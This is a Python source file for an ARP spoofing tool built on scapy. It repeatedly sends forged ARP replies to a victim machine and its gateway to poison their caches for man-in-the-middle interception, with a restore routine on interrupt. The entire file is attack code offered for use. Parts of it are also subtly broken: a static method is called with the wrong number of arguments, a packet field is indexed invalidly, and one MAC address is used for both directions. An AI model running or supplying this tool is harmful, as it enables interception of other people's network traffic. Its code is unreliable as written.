from scapy.all import *

import scapy.all as scapy
import time
import sys


class ArpSpoofer:
    def __init__(self,destinationMac, targetIP, gatewayIP, sourceMAC):
        self.destinationMac = destinationMac #is Mac address of victim machine
        self.targetIP = targetIP #is Ip address of victim machine
        self.gatewayIP = gatewayIP #is gatewayIP
        self.sourceMAC = sourceMAC



    @staticmethod
    def get_mac(destinationIP, srcIP):
        p = sr1(scapy.ARP(op=scapy.ARP.who_has, psrc=srcIP, pdst=destinationIP))
        return p[scapy.hwsrc]

    def spoofer(self,targetIP, spoofIP):
        packet = scapy.ARP(op=2, pdst=targetIP, hwdst=self.destinationMac, psrc=spoofIP)
        scapy.send(packet, verbose=False)

    def restore(self, destinationIP, sourceIP):
        packet = scapy.ARP(op=2, pdst=destinationIP, hwdst=self.get_mac(destinationIP), psrc=sourceIP, hwsrc=self.sourceMAC)
        scapy.send(packet, count=4, verbose=False)

    def start(self):
        packets = 0
        try:
            while True:
                self.spoofer(self.targetIP, self.gatewayIP)
                self.spoofer(self.gatewayIP, self.targetIP)
                print("\r[+] Sent packets " + str(packets)),
                sys.stdout.flush()
                packets += 2
                time.sleep(2)
        except KeyboardInterrupt:
            print("\nInterrupted Spoofing found CTRL + C------------ Restoring to normal state..")
            self.restore(self.targetIP, self.gatewayIP)
            self.restore(self.gatewayIP, self.targetIP)
